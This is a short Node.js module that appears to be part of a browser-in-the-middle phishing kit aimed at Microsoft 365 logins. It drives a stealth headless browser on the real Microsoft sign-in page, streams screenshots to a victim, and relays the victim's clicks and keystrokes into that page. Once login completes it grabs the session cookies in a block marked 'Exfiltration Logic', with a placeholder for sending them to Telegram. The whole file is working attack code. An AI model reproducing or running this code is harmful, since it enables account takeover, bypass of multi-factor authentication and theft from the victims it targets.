const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log(`[PROD] Launching browser for socket: ${socket.id}`);
    
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        // Initial Navigation
        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' });

        // Trigger the first render immediately after load
        const initialScreenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
        socket.emit('browser-render', { screenshot: initialScreenshot });

        // Interaction Handler
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'type') {
                    await page.type(data.selector || 'body', data.text, { delay: 50 });
                }
                
                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
                socket.emit('browser-render', { screenshot });
            } catch (err) {
                console.error('[!] Interaction Error:', err.message);
            }
        });

        // Exfiltration Logic
        page.on('framenavigated', async (frame) => {
            const url = frame.url();
            if (url.includes('shell/homepage') || url.includes('office.com')) {
                const cookies = await page.cookies();
                // Send to Telegram Logic here...
                socket.emit('success');
            }
        });

        socket.on('disconnect', async () => {
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL] Browser Start Failure:', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
